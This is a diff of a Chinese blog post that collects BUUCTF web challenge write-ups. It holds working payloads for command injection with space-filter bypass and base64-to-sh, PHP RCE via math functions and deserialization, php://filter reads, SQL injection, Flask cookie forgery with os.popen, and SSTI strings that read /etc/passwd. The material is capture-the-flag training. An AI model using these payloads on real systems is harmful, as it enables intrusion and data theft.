@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Immerse In BUU Day1, Web,CTF,Misc,JS,Python">
+    <meta name="keywords" content="BUU-web分类整理, Web,CTF,Misc,JS,Python">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Immerse In BUU Day1 | V1cuna&#39;s blog</title>
+    <title>BUU-web分类整理 | V1cuna&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/V1cuna.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/V1cuna/v1cuna.github.io/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Immerse In BUU Day1</h1>
+                    <h1 class="description center-align post-title">BUU-web分类整理</h1>
                 </div>
             </div>
         </div>
@@ -454,7 +454,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-04
+                    2025-03-02
                 </div>
                 
 
@@ -463,7 +463,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    4.6k
                 </div>
                 
 
@@ -480,10 +480,206 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>刚弄好新博客，慢慢来刷题了。</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>命令注入，<code>?ip=127.0.0.1|ls</code>发现存在flag.php和index.php,cat的时候发现各种口吐芬芳，手动fuzz了一下发现ban掉了flag的贪婪匹配，bash，空格。</p>
+                <h1 id="BUU-web分类整理"><a href="#BUU-web分类整理" class="headerlink" title="BUU-web分类整理"></a>BUU-web分类整理</h1><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：Header请求头</strong></p>
+<table>
+<thead>
+<tr>
+<th>Header</th>
+<th>解释</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Accept</td>
+<td>指定客户端能够接收的内容类型</td>
+<td>Accept: text/plain, text/html,application/json</td>
+</tr>
+<tr>
+<td>Accept-Charset</td>
+<td>浏览器可以接受的字符编码集。</td>
+<td>Accept-Charset: iso-8859-5</td>
+</tr>
+<tr>
+<td>Accept-Encoding</td>
+<td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
+<td>Accept-Encoding: compress, gzip</td>
+</tr>
+<tr>
+<td>Accept-Language</td>
+<td>浏览器可接受的语言</td>
+<td>Accept-Language: en,zh</td>
+</tr>
+<tr>
+<td>Accept-Ranges</td>
+<td>可以请求网页实体的一个或者多个子范围字段</td>
+<td>Accept-Ranges: bytes</td>
+</tr>
+<tr>
+<td>Authorization</td>
+<td>HTTP授权的授权证书</td>
+<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
+</tr>
+<tr>
+<td>Cache-Control</td>
+<td>指定请求和响应遵循的缓存机制</td>
+<td>Cache-Control: no-cache</td>
+</tr>
+<tr>
+<td>Connection</td>
+<td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
+<td>Connection: close</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
+<td>Cookie: $Version=1; Skin=new;</td>
+</tr>
+<tr>
+<td>Content-Length</td>
+<td>请求的内容长度</td>
+<td>Content-Length: 348</td>
+</tr>
+<tr>
+<td>Content-Type</td>
+<td>请求的与实体对应的MIME信息</td>
+<td>Content-Type: application/x-www-form-urlencoded</td>
+</tr>
+<tr>
+<td>Date</td>
+<td>请求发送的日期和时间</td>
+<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
+</tr>
+<tr>
+<td>Expect</td>
+<td>请求的特定的服务器行为</td>
+<td>Expect: 100-continue</td>
+</tr>
+<tr>
+<td>From</td>
+<td>发出请求的用户的Email</td>
+<td>From: <a href="mailto:user@email.com">user@email.com</a></td>
+</tr>
+<tr>
+<td>Host</td>
+<td>指定请求的服务器的域名和端口号</td>
+<td>Host: <a href="http://www.zcmhi.com" target="_blank" rel="noopener">www.zcmhi.com</a></td>
+</tr>
+<tr>
+<td>If-Match</td>
+<td>只有请求内容与实体相匹配才有效</td>
+<td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Modified-Since</td>
+<td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
+<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
+</tr>
+<tr>
+<td>If-None-Match</td>
+<td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
+<td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Range</td>
+<td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
+<td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Unmodified-Since</td>
+<td>只在实体在指定时间之后未被修改才请求成功</td>
+<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
+</tr>
+<tr>
+<td>Max-Forwards</td>
+<td>限制信息通过代理和网关传送的时间</td>
+<td>Max-Forwards: 10</td>
+</tr>
+<tr>
+<td>Pragma</td>
+<td>用来包含实现特定的指令</td>
+<td>Pragma: no-cache</td>
+</tr>
+<tr>
+<td>Proxy-Authorization</td>
+<td>连接到代理的授权证书</td>
+<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
+</tr>
+<tr>
+<td>Range</td>
+<td>只请求实体的一部分，指定范围</td>
+<td>Range: bytes=500-999</td>
+</tr>
+<tr>
+<td>Referer</td>
+<td>先前网页的地址，当前请求网页紧随其后,即来路</td>
+<td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives…</a></td>
+</tr>
+<tr>
+<td>TE</td>
+<td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
+<td>TE: trailers,deflate;q=0.5</td>
+</tr>
+<tr>
+<td>Upgrade</td>
+<td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
+<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>User-Agent的内容包含发出请求的用户信息</td>
+<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
+</tr>
+<tr>
+<td>Via</td>
+<td>通知中间网关或代理服务器地址，通信协议</td>
+<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
+</tr>
+<tr>
+<td>Warning</td>
+<td>关于消息实体的警告信息</td>
+<td>Warn: 199 Miscellaneous warning</td>
+</tr>
+</tbody></table>
+<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：unicode等价性</strong></p>
+<p>一个买东西的功能，尝试买一下最贵的。</p>
+<p>输入 id：4           price：1337</p>
+<p>回显：Only one char(?) allowed!</p>
+<p>结合题目unicorn，应该是利用了Unicode的等价性。</p>
+<p>可以在这个网站上直接查询<a href="https://www.compart.com/en/unicode/U+2031" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+2031</a></p>
+<p>关于Unicode的知识，详见wiki</p>
+<p>[<a href="https://zh.wikipedia.org/wiki/Unicode%E7%AD%89%E5%83%B9%E6%80%A7]" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Unicode%E7%AD%89%E5%83%B9%E6%80%A7]</a></p>
+<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：md5($password,true)</strong></p>
+<p>开幕只有一个输入框，啥都没有。</p>
+<p>查看源码，发现注释中一个header，想起来F12查看network中的头，找到hint：</p>
+<pre><code>Hint: select * from 'admin' where password=md5($pass,true)</code></pre><p>首先我们要找到一个字符串，这个字符串经过md5得到的16位原始二进制的字符串能帮我们实现sql注入。首先or这个字符串是必要的，同时为了配对原先sql语句里面有的单引号。在or的两边要有单引号，使它变成 password=‘xxx’or‘xxx’ 的形式。</p>
+<p>剩余的题目就是常规的md5绕过了。</p>
+<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：数学运算符构造payload</strong></p>
+<p>确实已经给了学习链接：</p>
+<p><a href="https://www.w3school.com.cn/php/php_ref_math.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/php_ref_math.asp</a></p>
+<p>只需要用这些数学运算符来拼凑一个可以被eval执行的payload</p>
+<p>要求80个字符以内</p>
+<p>我的payload是这样的：</p>
+<pre><code>?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></pre><p>其余的flag和分析可以看这个博客：</p>
+<p><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></p>
+<h2 id="CookieStore"><a href="#CookieStore" class="headerlink" title="CookieStore"></a>CookieStore</h2><p><strong>难度：易</strong></p>
+<p><strong>知识点：简单cookie伪造</strong></p>
+<p>由题名，买一下第一个，看cookie：</p>
+<pre><code>eyJtb25leSI6IDQ5LCAiaGlzdG9yeSI6IFsiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIl19
+经过base解码：
+{"money": 49, "history": ["Yummy chocolate chip cookie"]}</code></pre><p>同时注意到有一个请求主体：<code>id=0</code>，应该是说三种cookie的第一种</p>
+<p>49是对应的钱数，那么我们直接改一下重发试试。</p>
+<p>得到session：</p>
+<pre><code>eyJtb25leSI6IDEwMCwgImhpc3RvcnkiOiBbIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSIsICJZdW1teSBjaG9jb2xhdGUgY2hpcCBjb29raWUiLCAiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSIsICJmbGFnezEyNWM0ZTc0LWIwNjItNDI0MS1iYTczLTYyODc0Y2RjMjJlY31cbiJdfQ==</code></pre><p>解码得flag</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：bypass空格RCE，反引号内联，变量覆盖</strong></p>
+<p>命令注入，<code>?ip=127.0.0.1|ls</code>发现存在flag.php和index.php,cat的时候发现各种口吐芬芳，手动fuzz了一下发现ban掉了flag的贪婪匹配，bash，空格。</p>
 <p>index.php里应该有源码，问题在于绕过空格过滤。</p>
-<h3 id="绕过空格过滤："><a href="#绕过空格过滤：" class="headerlink" title="绕过空格过滤："></a>绕过空格过滤：</h3><ul>
+<p><strong>绕过空格过滤：</strong></p>
+<ul>
 <li><p>[:space:]    不行，[]被过滤</p>
 </li>
 <li><p>cat&lt;&gt;/index  不行，/&lt;&gt;均被过滤</p>
@@ -526,19 +722,26 @@ $? 是显示最后命令的退出状态，0表示没有错误，其他表示有�
 
 ?&gt;
 </code></pre><p>看到源码，下一步是bypass 过滤的flag字符串。</p>
-<h3 id="绕过flag过滤"><a href="#绕过flag过滤" class="headerlink" title="绕过flag过滤"></a>绕过flag过滤</h3><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>这里注意到有一个$a可以覆盖，联想到之前拆一句话小马的做法：</p>
+<p><strong>绕过flag过滤</strong></p>
+<p><strong>变量覆盖</strong></p>
+<p>这里注意到有一个$a可以覆盖，联想到之前拆一句话小马的做法：</p>
 <pre><code class="shell">payload：?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre>
-<h4 id="其他的payload："><a href="#其他的payload：" class="headerlink" title="其他的payload："></a>其他的payload：</h4><pre><code class="shell">?ip=1;echo$IFS$1Y2F0IGZsYWcucGhwCg==|base64$IFS$1-d|sh   #base64+sh（bash被过滤了）
+<p><strong>其他的payload：</strong></p>
+<pre><code class="shell">?ip=1;echo$IFS$1Y2F0IGZsYWcucGhwCg==|base64$IFS$1-d|sh   #base64+sh（bash被过滤了）
 ?ip=127.0.0.1;cat$IFS$9`ls` #反引号内联执行</code></pre>
-<h4 id="这里说一下反引号内联："><a href="#这里说一下反引号内联：" class="headerlink" title="这里说一下反引号内联："></a>这里说一下反引号内联：</h4><p>命令替代，大部分<code>Unix shell</code>以及编程语言如<code>Perl</code>、<code>PHP</code>以及<code>Ruby</code>等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。例如以下指令:</p>
-<pre><code class="shell">
-echo It is now `date` 
+<p><strong>这里说一下反引号内联：</strong></p>
+<p>命令替代，大部分<code>Unix shell</code>以及编程语言如<code>Perl</code>、<code>PHP</code>以及<code>Ruby</code>等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。例如以下指令:</p>
+<pre><code class="shell">echo It is now `date` 
 等价于：
 echo It is now 一 5月 5 05:16:04 GMT 2020
 在正式执行时会产生以下输出结果：
 It is now 一 5月 5 05:16:04 GMT 2020</code></pre>
-<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>点击tips发现url变成了：<code>buuoj.cn/?file=flag.php</code>，flag应该是被注释掉了。伪协议读取即可。</p>
-<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开题目，给出源码。</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：php://filter伪协议</strong></p>
+<p>点击tips发现url变成了：<code>buuoj.cn/?file=flag.php</code>，flag应该是被注释掉了。伪协议读取即可。</p>
+<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>难度：易</p>
+<p>考点：data&amp;filter伪协议，简单php反序列化</p>
+<p>打开题目，给出源码。</p>
 <pre><code class="php"> &lt;?php  
 $text = $_GET["text"];
 $file = $_GET["file"];
@@ -604,13 +807,258 @@ $a = new Flag();
 echo serialize($a);
 ?&gt;
 //O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code></pre><p>最后payload</p>
-<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</code></pre><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>一个买东西的功能，尝试买一下最贵的。</p>
-<p>输入 id：4           price：1337</p>
-<p>回显：Only one char(?) allowed!</p>
-<p>结合题目unicorn，应该是利用了Unicode的等价性。</p>
-<p>可以在这个网站上直接查询<a href="https://www.compart.com/en/unicode/U+2031" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+2031</a></p>
-<p>关于Unicode的知识，详见wiki</p>
-<p><a href="https://zh.wikipedia.org/wiki/Unicode等價性" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Unicode%E7%AD%89%E5%83%B9%E6%80%A7</a></p>
+<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</code></pre><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：RCE，简单的PHP反序列化</strong></p>
+<p>一直跳转，抓个包拦截一下。</p>
+<p>发现会自动submit两个参：</p>
+<p><img src="https://i.loli.net/2020/10/28/R2NGS3UpeCDTPW6.png" alt="2020朱雀-phpweb1.png"></p>
+<p>再次抓取，找到了这两个参数，看response发现是调用了函数，因此先想到了RCE。</p>
+<p>但是system等函数被过滤了，<code>file_get_contents</code>被放了出来，读flag.php发现无，可能不在当前目录或者换名字了。</p>
+<p>读一下php源码：</p>
+<pre><code class="php+HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;phpweb&lt;/title&gt;
+    &lt;style type="text/css"&gt;
+        body {
+            background: url("bg.jpg") no-repeat;
+            background-size: 100%;
+        }
+        p {
+            color: white;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;script language=javascript&gt;
+    setTimeout("document.form1.submit()",5000)
+&lt;/script&gt;
+&lt;p&gt;
+    &lt;?php
+    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+    function gettime($func, $p) {
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == "string") {
+            return $result;
+        } else {return "";}
+    }
+    class Test {
+        var $p = "Y-m-d h:i:s a";
+        var $func = "date";
+        function __destruct() {
+            if ($this-&gt;func != "") {
+                echo gettime($this-&gt;func, $this-&gt;p);
+            }
+        }
+    }
+    $func = $_REQUEST["func"];
+    $p = $_REQUEST["p"];
+
+    if ($func != null) {
+        $func = strtolower($func);
+        if (!in_array($func,$disable_fun)) {
+            echo gettime($func, $p);
+        }else {
+            die("Hacker...");
+        }
+    }
+    ?&gt;
+&lt;/p&gt;
+&lt;form  id=form1 name=form1 action="index.php" method=post&gt;
+    &lt;input type=hidden id=func name=func value='date'&gt;
+    &lt;input type=hidden id=p name=p value='Y-m-d h:i:s a'&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>发现有条简单的链子，肯定可以反序列化，但是。。。直接RCE也行啊····</p>
+<p>一个下划线就可以绕过了</p>
+<pre><code>func=\system&amp;p=cat $(find / -name flag*)</code></pre><p>但是。。。BUU上不行，我也不知道为什么，查了一下之前确实可以233</p>
+<p>那就老老实实搞链子吧，毕竟unserialize函数没有被禁，挺简单的，没什么过滤</p>
+<p>payload：</p>
+<pre><code>O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}</code></pre><h2 id="0CTF-piapiapia"><a href="#0CTF-piapiapia" class="headerlink" title="0CTF piapiapia"></a>0CTF piapiapia</h2><p><strong>难度：中等</strong></p>
+<p><strong>考点：PHP序列化逃逸</strong></p>
+<h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：smarty SSTi</strong></p>
+<p>简单注入，ls即可</p>
+<p>来自王叹之师傅博客中的一张图</p>
+<p><img src="https://img2018.cnblogs.com/blog/1625650/202002/1625650-20200216204049347-1844990197.png" alt="img"></p>
+<h2 id="Supercalc"><a href="#Supercalc" class="headerlink" title="Supercalc"></a>Supercalc</h2><hr>
+<p><strong>难度：易</strong></p>
+<p><strong>知识点：flask cookie伪造，flask session的安全问题</strong></p>
+<p>先输入一个<code>1+1</code>看一下包，注意到了session：</p>
+<pre><code>eyJoaXN0b3J5IjpbeyJjb2RlIjoiMSArIDEifV19.X4U6iA.oBstq0I1OScfmGf90WwDQ2ZJTDk</code></pre><p>有点像flask的。。。</p>
+<p>解一下（leavesong）：</p>
+<pre><code class="python">{'money': 9000, 'history': ['flag{23579e93-60f6-4ab2-b28c-b2118548ca9f}\n'], 'anti_tamper_hmac': '745fed2952b33f08eab8bee8db65a7e9'}//我不知道为什么会蹦出来picklestore里的flag·····
+{'history': [{'code': '1 + 1'}]} //这个是应该有的</code></pre>
+<p>反正继续做的话，应该是可以搞的，应该是继续伪造cookie</p>
+<p>key应该还是要通过来获得，利用<code>#</code>注释来尝试一下：</p>
+<pre><code>1/0#{{config}}</code></pre><p>果然找到了：</p>
+<pre><code>SECRET_KEY&amp;#39;: &amp;#39;cded826a1e89925035cc05f0907855f7</code></pre><p>伪造cookie：</p>
+<p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a>   注意在linux下</p>
+<pre><code class="shell">root@kali:~/Desktop/flask-session-cookie-manager
+python3 flask_session_cookie_manager3.py encode -s "cded826a1e89925035cc05f0907855f7" -t "{'history': [{'code': '__import__(\"os\").popen(\"cat flag.txt\").read()'}]}"                                                                 一开始我用的ls确定了是flag.txt            
+</code></pre>
+<p>伪造cookie重发即可，firefox中有自带重发以及preview，推荐</p>
+<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：SSTI模板注入，url_for</strong></p>
+<p>过滤：</p>
+<pre><code class="python">def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s</code></pre>
+<p>绕过：<code>url_for</code></p>
+<h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2><h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：二次注入，无列名注入bypass information_schema</strong></p>
+<p>payload：</p>
+<pre><code class="sql">-1'/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</code></pre>
+<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><strong>难度：易</strong></p>
+<p><strong>考点：Twig模板注入</strong></p>
+<p>由于题目给了cookie提示，直接看cookie，只有：</p>
+<pre><code class="http">Set-Cookie: user=1; expires=Wed, 26-Oct-2020 07:57:40 GMT; Max-Age=1800</code></pre>
+<p>尝试注入，因为BJD之前出的都是模板注入，在<code>user</code>处输入<code>{{1*'2'}}</code>尝试一下，发现果然还是模板注入2333</p>
+<p>给出一些模板注入的测试用例（<a href="https://websec.readthedocs.io/zh/latest/vuln/ssti.html）" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/vuln/ssti.html）</a></p>
+<ul>
+<li><p>简单的数学表达式，<code>{{ 7+7 }} =&gt; 14</code></p>
+</li>
+<li><p>字符串表达式 <code>{{ "ajin" }} =&gt; ajin</code></p>
+</li>
+<li><ul>
+<li><p>Ruby</p>
+<p><code>&lt;%= 7 * 7 %&gt;``&lt;%= File.open('/etc/passwd').read %&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Java</p>
+<p><code>${7*7}</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Twig</p>
+<p><code>{{7*'7'}}</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Smarty</p>
+<p><code>{php}echo</code>id<code>;{/php}</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>AngularJS</p>
+<p><code>$eval('1+1')</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Tornado</p>
+<p>引用模块 <code>{% import module %}</code>=&gt; <code>{% import os %}{{ os.popen("whoami").read() }}</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Flask/Jinja2</p>
+<p><code>{{ config }}``{{ config.items() }}``{{get_flashed_messages.__globals__['current_app'].config}}``{{''.__class__.__mro__[-1].__subclasses__()}}``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}``{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Django</p>
+<p><code>{{ request }}``{% debug %}``{% load module %}``{% include "x.html" %}``{% extends "x.html" %}</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p><strong>知识点：逻辑漏洞，cookie伪造，python反序列化</strong></p>
+<p><strong>难度：中等</strong></p>
+<p>登陆后是一个商城界面，发现视频下面写了：<code>==爆破*站：资金募集 11540.0==</code></p>
+<p><code>==ikun们冲鸭,一定要买到lv6!!!==</code></p>
+<p>所以我们是要买Lv6的产品，翻了几页没有看到，可以通过python脚本来查找。</p>
+<p>我们发现相同等级的示意图是一样的，F12查看，发现图片的src就带有相应的等级。</p>
+<p><img src="https://i.loli.net/2020/05/29/vIT8RqYujtwp3Nh.png" alt="CISCN华北ikun1.png"></p>
+<p>用requests库查询即可带有lv6.png的页面即可</p>
+<pre><code class="python">import requests
+import time
+for i in range(1,200):
+    print(i)
+    url = 'http://132bc261-1688-4891-be1e-dc1f5ff82988.node3.buuoj.cn/shop?page={}'.format(i)
+    r = requests.get(url)
+    if 'lv6.png' in r.text:
+        print(i)
+        print("bingo")
+        break
+    if r.status_code == 429: //BUU会有访问频率限制
+        print("too fast")
+        time.sleep(2)</code></pre>
+<p>得到LV6在181页<img src="https://i.loli.net/2020/05/29/7Cwe6VTgivnZQya.png" alt="CISCN华北ikun2.png"></p>
+<p>注册账号，发现钱只有1k，不够，从network看一下交易过程有没有可以操作的参数。</p>
+<p>发现用了JWT的身份验证。</p>
+<p>同时发现在提交的过程中传了一个discount参数为0.8，根据前面购物界面的<code>“-%20”</code>推测这是折扣的数值，那我们将其修改成一个极小值再重发就ok了。</p>
+<p>但是提示：==该页面，只允许admin访问==，联系到前面的JWT，我们需要伪造admin身份。</p>
+<blockquote>
+<p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。</p>
+</blockquote>
+<p>JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用<code>.</code>点号分割。例如我这里的JWT为：<br>JWT与session的相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p>
